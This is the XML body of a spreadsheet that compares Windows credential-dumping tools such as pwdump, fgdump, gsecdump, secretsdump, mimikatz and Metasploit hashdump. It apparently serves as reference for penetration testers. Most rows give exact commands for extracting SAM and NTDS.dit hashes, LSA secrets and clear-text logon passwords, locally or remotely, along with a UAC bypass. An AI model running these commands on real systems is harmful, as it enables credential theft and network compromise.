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71.99pt"/>
    </style:style>
    <style:style style:name="co2" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="11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270pt"/>
    </style:style>
    <style:style style:name="co6" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="142.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153.01pt"/>
    </style:style>
    <style:style style:name="co10" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="139.49pt"/>
    </style:style>
    <style:style style:name="co11" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="135.75pt"/>
    </style:style>
    <style:style style:name="co12" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="175.49pt"/>
    </style:style>
    <style:style style:name="co13" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="195.76pt"/>
    </style:style>
    <style:style style:name="co14" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="239.24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36pt"/>
    </style:style>
    <style:style style:name="co17" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="163.5pt"/>
    </style:style>
    <style:style style:name="co18" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="48.76pt"/>
    </style:style>
    <style:style style:name="co19" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="143.26pt"/>
    </style:style>
    <style:style style:name="co20" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="171.75pt"/>
    </style:style>
    <style:style style:name="co21" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="165pt"/>
    </style:style>
    <style:style style:name="co22" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="415.5pt"/>
    </style:style>
    <style:style style:name="co23" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="689.24pt"/>
    </style:style>
    <style:style style:name="co24" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="90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Tool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o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8" table:default-cell-style-name="Default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Command line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NTDS.dit</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Password history</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>LSA secrets</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Credential manager</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Protected storage</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Autologin</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Logon sessions</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Clear-text logon sessions</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Session tokens</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Cached domain logon information</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Wireless</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>VNC</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Certificates and keys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64-bit</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Windows XP/2003</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Windows Vista/2008/7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>RDP session isola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mmands</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.oxid.it/cain.html&quot;;&quot;Cain &amp; Abel&quot;)" office:value-type="string" office:string-value="Cain &amp; Abel" calcext:value-type="string">
            <text:p>Cain &amp; Abel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locally</text:p>
            <text:p>No remotely</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes locally</text:p>
            <text:p>No remotely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 and from reg files)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 dump SAM and LSA secrets remotely, use Cain to connect to the target machine as an administrative user, right-click on Services, then "Install Abel", refresh your Network tab and expand the target entry, then expand the Abel sub-entry and either dump SAM and password history from "Hashes" entry or LSA secrets from the entry below.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7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formula="of:=HYPERLINK(&quot;http://packetstormsecurity.org/files/13790/pwdump2.zip&quot;;&quot;pwdump2&quot;)" office:value-type="string" office:string-value="pwdump2" calcext:value-type="string">
            <text:p>pwdump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 (in-memory)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1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On 64-bit architecture it fails and displays "CreateRemoteThread failed: 5".</text:p>
            <text:p>On remote logon sessions via RDP it fails and displays "CreateRemoteThread failed: 8", run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;pwdump2.exe [lsass.exe PID]</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.foofus.net/~fizzgig/pwdump/&quot;;&quot;pwdump6&quot;)" office:value-type="string" office:string-value="pwdump6" calcext:value-type="string">
            <text:p>pwdump6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes. See not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ke sure you launch it from C:\ and not from a network shared folder.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;PwDump.exe -o pwdump6.log 127.0.0.1</text:p>
            <text:p>C:\&gt;PwDump.exe -x -o pwdump6.log 127.0.0.1                                                                        # 64-bit</text:p>
            <text:p>C:\&gt;PwDump.exe -o pwdump6.log -u Administrator -p &lt;password&gt; -s ADMIN$ 192.168.0.1   # remote, one IP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arasco.org/security/pwdump_7/index.html&quot;;&quot;pwdump7&quot;)" office:value-type="string" office:string-value="pwdump7" calcext:value-type="string">
            <text:p>pwdump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. See not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n domain controllers use in-memory tools or extract from ntds.dit file as SAM contains no domain users, just the "restore mode" administrator password of the DC</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;PwDump7.exe                                             # online SAM and SYSTEM registry files</text:p>
            <text:p>C:\&gt;PwDump7.exe -s &lt;samfile&gt; &lt;systemfile&gt;    # offline SAM and SYSTEM registry files</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.quarkslab.com/en-blog+read+13&quot;;&quot;Quarks PwDump&quot;)" office:value-type="string" office:string-value="Quarks PwDump" calcext:value-type="string">
            <text:p>Quarks Pw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. See notes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (from NTDS.dit)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:\&gt;quarks-pwdump.exe -dhl -hist -o hashes.txt # dump local SAM</text:p>
            <text:p>C:\&gt;quarks-pwdump.exe -dhdc -o cached.txt # dump cached domain logon information</text:p>
            <text:p>C:\&gt;quarks-pwdump.exe -dhd -hist -nt C:\Windows\NTDS\ntds.dit -o hashes.txt # dump domain password hashes</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;https://raw.github.com/rapid7/metasploit-framework/master/data/exploits/powershell/powerdump.ps1&quot;;&quot;PowerDump&quot;)" office:value-type="string" office:string-value="PowerDump" calcext:value-type="string">
            <text:p>Power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. See not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n domain controllers use in-memory tools or extract from ntds.dit file as SAM contains no domain users, just the "restore mode" administrator password of the DC</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Run as SYSTEM:</text:p>
            <text:p>C:\&gt;powershell Set-ExecutionPolicy Unrestricted</text:p>
            <text:p>C:\&gt;powershell C:\path\of\powerdump.ps1</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.foofus.net/~fizzgig/fgdump/&quot;;&quot;fgdump&quot;)" office:value-type="string" office:string-value="fgdump" calcext:value-type="string">
            <text:p>fg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 (?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Yes (in memory). See notes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 dump the cached domain creds, it embeds cachedump.exe and on 64-bit architecture it fails and displays "ERROR Unable to LoadLibrary lsasrv.dll (code 126)".</text:p>
            <text:p>The dumping of protected storage fails and displays "fgexec CallNamedPipe failed with error 2" regardless of the architecture.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;fgdump.exe -s -r -v -v -k -l fgdump.log -T 3 -O 32</text:p>
            <text:p>C:\&gt;fgdump.exe -s -r -v -v -k -l fgdump.log -T 3 -O 64    # 64-bit</text:p>
            <text:p>C:\&gt;fgdump.exe -s -r -v -v -k -l fgdump.log -T 3 -O 32 -h 192.168.0.1 -u Administrator -p &lt;password&gt;    # remote, one IP</text:p>
            <text:p>C:\&gt;fgdump.exe -s -r -v -v -k -l fgdump.log -T 3 -O 32 -f ips.txt -u Administrator -p &lt;password&gt;               # remote, IP list</text:p>
            <text:p>C:\&gt;fgdump.exe -s -r -v -v -k -l fgdump.log -T 3 -O 32 -H ips_creds.txt                                                     # remote, IP and creds list</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://packetstormsecurity.org/files/62371/PWDumpX14.zip&quot;;&quot;PWDumpX&quot;)" office:value-type="string" office:string-value="PWDumpX" calcext:value-type="string">
            <text:p>PWDumpX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?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n 64-bit architecture it fails and displays "ERROR! Cannot start PWDumpX service on host".</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;PWDumpX.exe -clph 127.0.0.1 + +                                       # use current logon session credentials</text:p>
            <text:p>C:\&gt;PWDumpX.exe -clph 127.0.0.1 Administrator &lt;password&gt;</text:p>
            <text:p>C:\&gt;PWDumpX.exe -clph ips.txt + +                                             # remote, IP list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ruesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5&quot;;&quot;gsecdump&quot;)" office:value-type="string" office:string-value="gsecdump" calcext:value-type="string">
            <text:p>gsec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). See notes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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump). See notes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gsecdump is excellent in dumping LSA secrets regardless of the Windows version and architecture.</text:p>
            <text:p>Since version 2.0b5 it is also reliable to dump SAM/AD hashes as well as logon sessions regardless of the Windows version and architecture.</text:p>
            <text:p>On remote logon sessions via RDP it fails and displays "error [6] in GetExitCodeThread: The handle is invalid" or "error [8] in CreateRemoteThread: Not enough storage is available to process this command", run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;gsecdump.exe -a</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;https://impacket.googlecode.com/svn/trunk/examples/secretsdump.py&quot;;&quot;secretsdump&quot;)" office:value-type="string" office:string-value="secretsdump" calcext:value-type="string">
            <text:p>secrets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</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (from NTDS.dit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$ secretsdump.py -debug -outputfile target_ip DOMAIN/Administrator:password@192.168.0.1</text:p>
            <text:p>$ secretsdump.py -debug -outputfile target_ip -hashes LMhash:NThash DOMAIN/Administrator@192.168.0.1</text:p>
            <text:p>$ secretsdump.py -debug -outputfile target_ip -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit LOCAL</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://h.ackack.net/carrot-exe.html&quot;;&quot;carrot&quot;)" office:value-type="string" office:string-value="carrot" calcext:value-type="string">
            <text:p>carrot</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes. See not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. See notes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (?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4"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t is a bundle of the other tools including the NirSoft ones (netpass, WirelessKetView, etc).</text:p>
            <text:p>Prefer netpass to dump the credential manager.</text:p>
            <text:p>To dump SAM hashes it uses pwdump7.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;carrot.exe /nouac                                          # as SYSTEM, disable UAC</text:p>
            <text:p>C:\&gt;carrot.exe /32 /pwdump /np /ps /wlan /vnc    # as user or Administrator</text:p>
            <text:p>C:\&gt;carrot.exe /64 /pwdump /np /ps /wlan /vnc    # as user or Administrator, 64-bit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smart_hashdump.rb&quot;;&quot;Metasploit smart_hashdump (post module)&quot;)" office:value-type="string" office:string-value="Metasploit smart_hashdump (post module)" calcext:value-type="string">
            <text:p>Metasploit smart_hashdump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12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When run on domain controllers, it will use the in-memory technique to dump domain users' credentials. Vice versa when the target is a workstation it will dump the hashes from SAM file instead.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>run post/windows/gather/smart_hashdump GETSYSTEM=true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hashdump.rb&quot;;&quot;Metasploit hashdump (post module)&quot;)" office:value-type="string" office:string-value="Metasploit hashdump (post module)" calcext:value-type="string">
            <text:p>Metasploit hashdump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. See not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n domain controllers, prefer Metasploit smart_hashdump post modules because SAM file does not contain domain users' information.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>run post/windows/gather/hashdump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scripts/meterpreter/hashdump.rb&quot;;&quot;Metasploit hashdump (script)&quot;)" office:value-type="string" office:string-value="Metasploit hashdump (script)" calcext:value-type="string">
            <text:p>Metasploit hashdump (script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. See not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n domain controllers, prefer Metasploit smart_hashdump post modules because SAM file does not contain domain users' information.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>run hashdump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lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/passwd.rb&quot;;&quot;Metasploit hashdump (command)&quot;)" office:value-type="string" office:string-value="Metasploit hashdump (command)" calcext:value-type="string">
            <text:p>Metasploit hashdump (command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). See notes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1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refer to run as SYSTEM.</text:p>
            <text:p>On 64-bit architecture running as SYSTEM within a shell with UAC bypassed it fails and displays "priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect".</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>run post/windows/escalate/bypassuac </text:p>
            <text:p>Background session &lt;X&gt;? [y/N]  y</text:p>
            <text:p>msf  exploit(handler) &gt; sessions -l</text:p>
            <text:p>msf  exploit(handler) &gt; sessions -i &lt;X&gt;+1    # these steps are recommended against Windows Vista and Windows 7 to dump SAM hashes from memory</text:p>
            <text:p>hashdump</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;https://code.google.com/p/mimikatz/&quot;;&quot;mimikatz&quot;)" office:value-type="string" office:string-value="mimikatz" calcext:value-type="string">
            <text:p>mimikatz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Unreliable. See not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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump and impersonate)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Yes (exportable and</text:p>
            <text:p>non-exportable)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="5" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>For details on @getLogonPasswords command refer too:</text:p>
            <text:p>http://blog.gentilkiwi.com/securite/pass-the-pass</text:p>
            <text:p>http://blog.gentilkiwi.com/securite/re-pass-the-pass</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Run as any user:</text:p>
            <text:p>mimikatz # samdump::hashes &lt;systemfile&gt; &lt;samfile&gt;    # dump SAM hashes from registry file</text:p>
            <text:p/>
            <text:p>Run as SYSTEM (psexec.exe -s cmd.exe) or alternatively assign yourself SeDebugPrivilege with "privilege::debug":</text:p>
            <text:p>mimikatz # inject::process lsass.exe sekurlsa.dll             # required to dump hashes from memory and other operations</text:p>
            <text:p>mimikatz # @getLocalAccounts                                       # dump SAM hashes from memory</text:p>
            <text:p>mimikatz # @getSecrets                                                  # dump LSA secrets</text:p>
            <text:p>mimikatz # @getLogonSessions                                      # dump logon sessions</text:p>
            <text:p>mimikatz # @getLogonPasswords                                   # dump clear-text passwords for all sessions (console, RDP, services)</text:p>
            <text:p>mimikatz # crypto::patchcng</text:p>
            <text:p/>
            <text:p>Run as user or Administrator:</text:p>
            <text:p>mimikatz # divers::secrets                                                # dump a subset of credential manager ('LegacyGeneric' entries only)</text:p>
            <text:p>mimikatz # crypto::patchcapi</text:p>
            <text:p>mimikatz # crypto::exportCertificates                                # dump user's DER and PFX certificates</text:p>
            <text:p>mimikatz # crypto::exportKeys                                          # dump user's PVK keys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oolcrypt.org/tools/pwhist/index.html&quot;;&quot;pwhist&quot;)" office:value-type="string" office:string-value="pwhist" calcext:value-type="string">
            <text:p>pwhis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(in-memory)</text:p>
          </table:table-cell>
          <table:table-cell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Run as SYSTEM (psexec.exe -s cmd.exe):</text:p>
            <text:p>C:\&gt;pwhist.exe                                             # in-memory technique</text:p>
            <text:p>C:\&gt;pwhist.exe -s &lt;systemfile&gt; &lt;samfile&gt;    # offline SAM and SYSTEM registry files</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.objectif-securite.ch/&quot;;&quot;bkhive / samdump2&quot;)" office:value-type="string" office:string-value="bkhive / samdump2" calcext:value-type="string">
            <text:p>bkhive / samdump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1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10" table:formula="of:=HYPERLINK(&quot;http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&quot;;&quot;Dump SAM hashes with physical access to the system&quot;)" office:value-type="string" office:string-value="Dump SAM hashes with physical access to the system" calcext:value-type="string">
            <text:p>Dump SAM hashes with physical access to the system</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p># mkdir -p /mnt/sda1</text:p>
            <text:p># mount /dev/sda1 /mnt/sda1</text:p>
            <text:p># bkhive /mnt/sda1/Windows/System32/config/SYSTEM /tmp/saved-syskey.txt</text:p>
            <text:p># samdump2 /mnt/sda1/Windows/System32/config/SAM /tmp/saved-syskey.txt &gt; /tmp/hashes.txt</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://code.google.com/p/creddump/&quot;;&quot;creddump by moyix&quot;)" office:value-type="string" office:string-value="creddump by moyix" calcext:value-type="string">
            <text:p>creddump by moyix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.</text:p>
            <text:p>See not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o dump LSA secrets of Windows Vista and above versions, use the enhanced version of creddump part of ntds_dump_hash - the tool is called lsadumpw2k8.py</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>$ ./pwdump.py</text:p>
            <text:p>usage: ./pwdump.py &lt;system hive&gt; &lt;SAM hive&gt;</text:p>
            <text:p>$ ./cachedump.py</text:p>
            <text:p>usage: ./cachedump.py &lt;system hive&gt; &lt;security hive&gt;</text:p>
            <text:p>$ ./lsadump.py</text:p>
            <text:p>usage: ./lsadump.py &lt;system hive&gt; &lt;security hive&gt;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tdsxtract.com/downloads/ntds_dump_hash.zip&quot;;&quot;ntds_dump_hash&quot;)" office:value-type="string" office:string-value="ntds_dump_hash" calcext:value-type="string">
            <text:p>ntds_dump_hash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NTDS.dit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ncludes an updated version of moyix's creddump</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>$ wget http://csababarta.com/downloads/ntds_dump_hash.zip</text:p>
            <text:p>$ unzip ntds_dump_hash.zip</text:p>
            <text:p>$ cd libesedb</text:p>
            <text:p>$ ./configure &amp;&amp; make</text:p>
            <text:p>$ cd esedbtools</text:p>
            <text:p>$ ./esedbdumphash -v -t /tmp/output &lt;ntds.dit file&gt;</text:p>
            <text:p>$ ls -1 /tmp/output.export/</text:p>
            <text:p>datatable</text:p>
            <text:p>$ cd ../../creddump/</text:p>
            <text:p>$ chmod +x *.py</text:p>
            <text:p>$ ./dsuserinfo.py /tmp/output.export/datatable</text:p>
            <text:p>$ ./dsdump.py &lt;SYSTEM file&gt; /tmp/output.export/datatable --include-locked --include-disabled &gt; domain_hashes.txt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tdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&quot;;&quot;NTDSXtract&quot;)" office:value-type="string" office:string-value="NTDSXtract" calcext:value-type="string">
            <text:p>NTDSXtrac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NTDS.dit)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="10" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (?)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10" table:formula="of:=HYPERLINK(&quot;http://csababarta.com/downloads/ntdsxtract/ntds_forensics.pdf&quot;;&quot;NTDS.DIT Forensics&quot;)" office:value-type="string" office:string-value="NTDS.DIT Forensics" calcext:value-type="string">
            <text:p>NTDS.DIT Forensics</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Download and install libesedb from http://sourceforge.net/projects/libesedb/files/libesedb-alpha/:</text:p>
            <text:p>$ tar xvfz libesedb-alpha-20111210.tar.gz </text:p>
            <text:p>$ cd libesedb-20111210/</text:p>
            <text:p>$ ./configure</text:p>
            <text:p>$ make</text:p>
            <text:p># make install    # as root</text:p>
            <text:p>$ esedbexport -l /tmp/esedbexport.log -t /tmp/ntds.dit &lt;ntds.dit&gt;</text:p>
            <text:p>$ ls -1 /tmp/ntds.dit.export/</text:p>
            <text:p>datatable.3</text:p>
            <text:p>hiddentable.4</text:p>
            <text:p>link_table.5</text:p>
            <text:p>[...]</text:p>
            <text:p>$ wget http://csababarta.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip</text:p>
            <text:p>$ unzip ntdsxtract_v1_0.zip</text:p>
            <text:p>$ cd NTDSXtract\ 1.0</text:p>
            <text:p>$ python dsusers.py /tmp/ntds.dit.export/datatable.3 /tmp/ntds.dit.export/link_table.5 --passwordhashes &lt;SYSTEM file&gt; --passwordhistory &lt;SYSTEM file&gt; --certificates --supplcreds &lt;SYSTEM file&gt; --membership &gt; /tmp/ntds.dit.output</text:p>
            <text:p>$ wget https://raw.github.com/inquisb/miscellaneous/master/ntdstopwdump.py</text:p>
            <text:p>$ python ntdstopwdump.py /tmp/ntds.dit.output</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.passcape.com/windows_password_recovery&quot;;&quot;passcape Windows Password Recovery&quot;)" office:value-type="string" office:string-value="passcape Windows Password Recovery" calcext:value-type="string">
            <text:p>passcape Windows Password Recover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 and from reg files)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (from NTDS.dit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in-memory?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? and from reg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he trial version is limited in functionalities, however it can dump SAM hashes from registry files and in-memory locally.</text:p>
            <text:p>The lifetime personal license light edition costs $65.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7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formula="of:=HYPERLINK(&quot;http://www.samba.org/samba/docs/man/manpages-3/pdbedit.8.html&quot;;&quot;pdbedit on Unix/Linux&quot;)" office:value-type="string" office:string-value="pdbedit on Unix/Linux" calcext:value-type="string">
            <text:p>pdbedit on Unix/Linux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domain users, from Samba's config)</text:p>
          </table:table-cell>
          <table:table-cell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-</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=HYPERLINK(&quot;http://www.nth-dimension.org.uk/blog.php?id=86&quot;;&quot;Dumping Samba hashes&quot;)" office:value-type="string" office:string-value="Dumping Samba hashes" calcext:value-type="string">
            <text:p>Dumping Samba hashes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p># pdbedit -L -w -s /etc/samba/smb.conf | perl -e 'while (&lt;&gt;) { @smbpasswd = split(/:/, $_); print $smbpasswd[0] . ":" . $smbpasswd[1] . ":" . (($smbpasswd[2] eq "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") ? "NO PASSWORD*********************" : $smbpasswd[2]) . ":" . (($smbpasswd[3] eq "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") ? "NO PASSWORD*********************" : $smbpasswd[3]) . ":::\n"; }'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.passcape.com/network_password_recovery&quot;;&quot;passcape Network Password Recovery&quot;)" office:value-type="string" office:string-value="passcape Network Password Recovery" calcext:value-type="string">
            <text:p>passcape Network Password Recover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. See notes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes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he trial version can dump all, but displays only the first three characters of dumped passwords.</text:p>
            <text:p>The lifetime personal license costs $32.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7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formula="of:=HYPERLINK(&quot;http://packetstormsecurity.org/files/10457/lsadump2.zip&quot;;&quot;lsadump2&quot;)" office:value-type="string" office:string-value="lsadump2" calcext:value-type="string">
            <text:p>lsadump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Yes (in memory)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7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 (?)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On 64-bit architecture it fails and displays "CreateRemoteThread failed: 5".</text:p>
            <text:p>On remote logon sessions via RDP it fails and displays "CreateRemoteThread failed: 8", run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;lsadump2.exe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lsa_secrets_dump.html&quot;;&quot;LSASecretsDump&quot;)" office:value-type="string" office:string-value="LSASecretsDump" calcext:value-type="string">
            <text:p>LSASecrets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7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It has always failed to dump all LSA secrets of services running as legitimate Windows local users regardless of the architecture on both Windows 7 and Windows Server 2003 SP2.</text:p>
            <text:p>On remote logon sessions via RDP it fails, run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;LSASecretsDump.exe -empty</text:p>
            <text:p>C:\&gt;LSASecretsDump-x64.exe -empty    # 64-bit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lsa_secrets_view.html&quot;;&quot;LSASecretsView&quot;)" office:value-type="string" office:string-value="LSASecretsView" calcext:value-type="string">
            <text:p>LSASecretsView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7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As per LSASecretsDump, it has always failed to dump all LSA secrets.</text:p>
            <text:p>On remote logon sessions via RDP it fails, run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7"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network_password_recovery.html&quot;;&quot;Network Password Recovery (netpass)&quot;)" office:value-type="string" office:string-value="Network Password Recovery (netpass)" calcext:value-type="string">
            <text:p>Network Password Recovery (netpass)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes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(via LSA secrets)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="7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ke sure you run the 64-bit version of this tool on 64-bit architecture otherwise no entries will be dumped.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;netpass.exe /scomma netpass.csv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credentials/enum_cred_store.rb&quot;;&quot;Metasploit gather/credentials/enum_cred_store (post module)&quot;)" office:value-type="string" office:string-value="Metasploit gather/credentials/enum_cred_store (post module)" calcext:value-type="string">
